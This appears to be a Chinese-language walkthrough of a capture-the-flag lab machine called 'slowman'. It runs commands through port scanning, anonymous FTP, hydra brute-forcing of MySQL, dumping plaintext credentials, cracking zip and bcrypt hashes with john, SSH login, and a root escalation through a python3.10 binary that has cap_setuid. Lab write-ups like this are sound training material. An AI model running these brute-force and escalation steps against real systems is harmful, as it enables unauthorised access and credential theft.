# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 01:24 EDT

Nmap scan report for slowman (192.168.2.5)
Host is up (0.00020s latency).
MAC Address: 08:00:27:9C:75:DB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 3.55 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.2.5  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 01:25 EDT
Nmap scan report for slowman (192.168.2.5)
Host is up (0.00035s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
3306/tcp open   mysql
MAC Address: 08:00:27:9C:75:DB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds
                                                                     
┌──(kali㉿kali)-[~]
└─$ nmap -A -p20,21,22,80,3306 192.168.2.5 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 01:26 EDT
Nmap scan report for slowman (192.168.2.5)
Host is up (0.00027s latency).

PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
|_  256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Fastgym
|_http-server-header: Apache/2.4.52 (Ubuntu)
3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.35-0ubuntu0.22.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Support41Auth, FoundRows, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, SupportsLoadDataLocal, LongColumnFlag, SwitchToSSLAfterHandshake, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: +H<{VEi.)+!pWF4T`\x1F4[
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
| Not valid before: 2023-11-22T19:44:52
|_Not valid after:  2033-11-19T19:44:52
MAC Address: 08:00:27:9C:75:DB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (94%), OpenWrt 21.02 (Linux 5.4) (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.1 - 5.15 (93%), Linux 6.0 (93%), Linux 2.6.39 (93%), OpenWrt 22.03 (Linux 5.10) (93%), Linux 2.6.22 - 2.6.36 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms slowman (192.168.2.5)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.98 seconds
```

# 漏洞利用

21端口可以匿名登陆，拿到了一个allowedusersmysql.txt文件

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.2.5  
Connected to 192.168.2.5.
220 (vsFTPd 3.0.5)
Name (192.168.2.5:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Nov 22  2023 .
drwxr-xr-x    2 0        121          4096 Nov 22  2023 ..
-rw-r--r--    1 0        0              12 Nov 22  2023 allowedusersmysql.txt
226 Directory send OK.
ftp> get allowedusersmysql.txt
local: allowedusersmysql.txt remote: allowedusersmysql.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for allowedusersmysql.txt (12 bytes).
100% |************************|    12       29.97 KiB/s    00:00 ETA
226 Transfer complete.
12 bytes received in 00:00 (15.75 KiB/s)
```

查看一下allowedusersmysql.txt

```
┌──(kali㉿kali)-[~]
└─$ cat allowedusersmysql.txt 
trainerjeff
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.5 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              git,html,php,txt,jpg,png,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://192.168.2.5/images/]                                                          
/index.html           (Status: 200) [Size: 16430]
/contact.html         (Status: 200) [Size: 5232]
/css                  (Status: 301) [Size: 308] [--> http://192.168.2.5/css/]                                                             
/js                   (Status: 301) [Size: 307] [--> http://192.168.2.5/js/]                                                              
/why.html             (Status: 200) [Size: 6115]
/.html                (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/trainer.html         (Status: 200) [Size: 6407]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 276]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

尝试爆破mysql密码

```
┌──(kali㉿kali)-[~]
└─$ hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.2.5 mysql
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-08 04:26:06
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.2.5:3306/
[3306][mysql] host: 192.168.2.5   login: trainerjeff   password: soccer1                                                                  
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-08 04:26:22
```

连接一下数据库

```
┌──(kali㉿kali)-[~]
└─$ mysql -h 192.168.2.5 -u trainerjeff -p           
Enter password: 
ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
                                                                     
┌──(kali㉿kali)-[~]
└─$ mysql -h 192.168.2.5 -u trainerjeff -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1082
Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| trainers_db        |
+--------------------+
5 rows in set (0.004 sec)

MySQL [(none)]> use trainers_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [trainers_db]> show tables;
+-----------------------+
| Tables_in_trainers_db |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.001 sec)

MySQL [trainers_db]> select * from users
    -> ;
+----+-----------------+-------------------------------+
| id | user            | password                      |
+----+-----------------+-------------------------------+
|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |
|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
+----+-----------------+-------------------------------+
2 rows in set (0.001 sec)
```

得到一个路径和用户名密码，登录以后拿到了一个压缩包：credentials.zip

```
┌──(kali㉿kali)-[~]
└─$ zip2john credentials.zip > zip.hash
ver 2.0 efh 5455 efh 7875 credentials.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=117, crc=4981406D ts=9E02 cs=9e02 type=8
                                                                     
┌──(kali㉿kali)-[~]
└─$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (credentials.zip/passwords.txt)     
1g 0:00:00:00 DONE (2026-04-08 04:33) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~]
└─$ unzip credentials.zip                                 
Archive:  credentials.zip
[credentials.zip] passwords.txt password: 
  inflating: passwords.txt
┌──(kali㉿kali)-[~]
└─$ cat passwords.txt                             
----------
$USERS: trainerjean

$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq 
----------
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tweety1          (?)     
1g 0:00:00:04 DONE (2026-04-08 04:35) 0.2028g/s 233.6p/s 233.6c/s 233.6C/s thuglife..summer1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

ssh连接

```
┌──(kali㉿kali)-[~]
└─$ ssh trainerjean@192.168.2.5
trainerjean@192.168.2.5's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of mié 08 abr 2026 08:36:37 UTC

  System load:  0.0               Processes:               107
  Usage of /:   66.5% of 9.75GB   Users logged in:         0
  Memory usage: 46%               IPv4 address for enp0s3: 192.168.2.5
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

El mantenimiento de seguridad expandido para Applications está desactivado

Se pueden aplicar 36 actualizaciones de forma inmediata.
Para ver estas actualizaciones adicionales, ejecute: apt list --upgradable

Active ESM Apps para recibir futuras actualizaciones de seguridad adicionales.
Vea https://ubuntu.com/esm o ejecute «sudo pro status»


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 24 19:53:52 2023 from 192.168.2.5
trainerjean@slowman:~$
```

# 权限提升

```
trainerjean@slowman:~$ sudo -l
[sudo] password for trainerjean: 
Sorry, user trainerjean may not run sudo on slowman.
trainerjean@slowman:~$ find / -perm -4000 2>/dev/null
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/snapd/20290/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/bin/mount
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/libexec/polkit-agent-helper-1
trainerjean@slowman:~$ getcap -r / 2>/dev/null
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
/snap/core20/1974/usr/bin/ping cap_net_raw=ep
/snap/snapd/26382/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
trainerjean@slowman:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@slowman:~# id
uid=0(root) gid=1002(trainerjean) groups=1002(trainerjean)
```
